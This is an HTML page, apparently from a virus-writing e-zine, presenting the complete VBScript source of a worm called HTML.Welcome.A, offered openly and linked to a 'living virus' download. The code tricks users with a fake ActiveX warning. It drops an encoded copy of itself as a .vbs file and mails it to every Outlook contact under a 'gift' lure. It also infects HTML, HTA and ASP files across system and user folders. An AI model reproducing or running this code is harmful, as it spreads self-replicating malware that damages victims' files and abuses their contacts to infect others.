<html>
<head>
<title>rRlf #2</title>
</head>
<body text="#ffffff" link="#58b3f6" vlink="#58b3f6" alink="#58b3f6" background="background.jpg">
<center>
<img src="logo.jpg">
<br><i>Infiltration of a Nation</i>
<br><table cellpadding="9">
<tr>
<th><a href="12.html">last article</a></th>
<th><a href="01.html">table of contents</a></th>
<th><a href="14.html">next article</a></th>
</tr>
</table>
</center>
<p><b><u>HTML.Welcome.A by PetiK</u></b>
<p>< welcome >
<br>< html >< head >< title >Welcome< /title >
<br>< body onLoad="window.status='Welcome to my last creation'" >
<br>< SCRIPT Language=VBScript >
<br>On Error Resume Next
<br>msgbox "Please accept the ActiveX",vbinformation,"MSIE Warning !"
<br>Set fso=CreateObject("Scripting.FileSystemObject")
<br>Set ws=CreateObject("WScript.Shell")
<br>If err.number=429 then
<br>ws.Run javascript:location.reload()
<br>Else
<p>vbsn=""
<br>For vbsname=1 To 8
<br>randomize(timer)
<br>vbsn=vbsn & chr(int(rnd(1)*26)+65)
<br>Next
<br>vbsn=vbsn&".vbs"
<p>htms=document.body.createTextRange.htmltext
<br>Set vbsf=fso.CreateTextFile("C:\"&vbsn,2,True)
<br>vbsf.WriteLine "Set fs=CreateObject(""Scripting.FileSystemObject"")"
<br>vbsf.WriteLine "Set ws=CreateObject(""WScript.Shell"")"
<br>vbsf.Write "htm="""
<p>For i=1 To Len(htms)
<br>e=Mid(htms,i,1)
<br>e=Hex(Asc(e))
<br>If Len(e)=1 Then
<br>e="0"&e
<br>End If
<br>vbsf.Write e
<br>Next
<p>vbsf.Write """"
<br>vbsf.WriteLine ""
<br>vbsf.WriteLine "Set newhtm=fs.CreateTextFile(""C:\Welcome2U.htm"",True,2)"
<br>vbsf.WriteLine "newhtm.WriteLine ""< welcome >"""
<br>vbsf.WriteLine "newhtm.WriteLine ""< html >< head >< title >Welcome< /title >"""
<br>vbsf.WriteLine "newhtm.WriteLine ""< body onLoad=""""window.status='Welcome to my last creation'"""" >"""
<br>vbsf.WriteLine "read="""""
<br>vbsf.WriteLine "For pos=1 To Len(htm) Step 2"
<br>vbsf.WriteLine "read=read " &Chr(38)& " Chr(""" &Chr(38)& "h"""&Chr(38)& " Mid(htm,pos,2))"
<br>vbsf.WriteLine "Next"
<br>vbsf.WriteLine "newhtm.Write read"
<br>vbsf.WriteLine "newhtm.WriteLine ""< /body >< /html >"""
<br>vbsf.WriteLine "newhtm.Close"
<br>vbsf.WriteLine "ws.Run ""C:\Welcome2U.htm"""
<br>vbsf.Close
<p>Set win=fso.GetSpecialFolder(0)
<br>Set sys=fso.GetSpecialFolder(1)
<p>Set out=CreateObject("Outlook.Application")
<br>Set map=out.GetNameSpace("MAPI")
<br>For Each adr In map.AddressLists
<br>If adr.AddressEntries <> 0 Then
<br>For addr=1 To adr.Addressentries.Count
<br>Set nadr=adr.AddressEntries(addr)
<br>Set mel=out.CreateItem(0)
<br>mel.To=nadr.Address
<br>mel.Subject="A Gift from your best friend"
<br>mel.Body="This is for you (" &left(vbsn,8)& ")."
<br>mel.Attachments.Add("C:\"&vbsn)
<br>mel.Send
<br>Next
<br>End If
<br>Next
<p>infect(win)
<br>infect(sys)
<br>infect(fso.GetSpecialFolder(1))
<br>infect(ws.SpecialFolders("MyDocuments"))
<br>infect(ws.SpecialFolders("Desktop"))
<br>infect(ws.SpecialFolders("Favorites"))
<br>infect(ws.SpecialFolders("Recent"))
<p>If Day(Now())=7 Then
<br>document.write "< font face='Lucida Console' size='2' color=black >Welcome to my last creation : HTML.Welcome.A< br >Coded by PetiK/[rRlf]< br >< /font >"
<br>Else
<br>document.write "< font face='Lucida Console' size='3' color=black >Welcome To You !< br >Have a nice day.< br >< /font >"
<br>End If
<p>End If
<p>Function infect(doss)
<br>Set FolderObj = FSO.GetFolder(doss)
<br>&nbsp;&nbsp;&nbsp;Set FO = FolderObj.Files
<br>&nbsp;&nbsp;&nbsp;For each cible in FO
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ext = lcase(FSO.GetExtensionName(cible.Name))
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ext="htm" or ext="html" or ext="htz" or ext="hta" or ext="asp"  Then
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Set good = fso.OpenTextFile(cible.path, 1, False)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if good.readline <> "< welcome >" Then
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good.close()
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Set good = fso.OpenTextFile(cible.path, 1, False)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;htmorg = good.ReadAll()
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good.close()
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Set virus = document.body.createTextRange
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Set good = fso.CreateTextFile(cible.path, True, False)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good.WriteLine "< welcome >"
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good.Write(htmorg)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good.WriteLine virus.htmltext
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good.Close()
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good.close()
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end if
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end if
<br>&nbsp;&nbsp;&nbsp;next
<br>End Function
<p>< /script >
<br>< /body >< /html >
<br>&nbsp;
<br>&nbsp;<a href="13.zip">living virus</a>
</body>
</html>

